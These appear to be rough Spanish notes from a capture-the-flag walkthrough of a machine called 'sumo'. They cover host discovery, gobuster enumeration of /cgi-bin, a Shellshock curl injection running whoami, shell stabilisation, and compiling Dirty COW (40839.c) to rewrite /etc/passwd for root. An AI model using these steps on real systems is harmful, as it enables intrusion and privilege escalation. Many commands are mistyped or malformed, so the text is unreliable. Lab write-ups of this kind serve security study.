sumo:1 descargar el mirror

arp-scan --localnet -I ens33 --ignoredups

shellshock

gobuster dir -w /usr/share/seclists/dicovery/swebconte/dire -u http -t 20 --add-slash

descubrimos /cgi-bin/

gobuster -u /cgi-bin 0x sh,pl,cgi

http://cgi-bin/test.sh

how attackers are using shellshock

curl -s "http://ip/cgi-bin/test.sh" -H "User;agen () { :; } echo; /usr/bin/whoami"

aplicamos reverse shell

listo 

script /dev/null -c bash

contrl z
stty raw -echo; fg
export temr-xterm
exposrt sehll-bash
stty rwows 44column 22

lsb_release -a
para saber que distribucion tiene especificamente
searchsploit hernel 3.2

dirty cow son script en C, race condition
es una vulnerabilidad para el kernel de algunas versiones de linux

searchsplit dirty cow /etc/passwd 
ptrace_algo

es un script completo para ejecutar

which gcc para compilar codigo c

altera el /etc/passwd
para crear un nuevo usuario
sobre root y te deja elegir una contrasenia incluso

./dirty

searchsploit -m linux/local/40839.c
para descargarte el archivo

python3 -m http.server 80
wget ip/40839.c

cat dirtycow.c | grep gcc
gcc -pthread dirty.c -p dirty -crypt





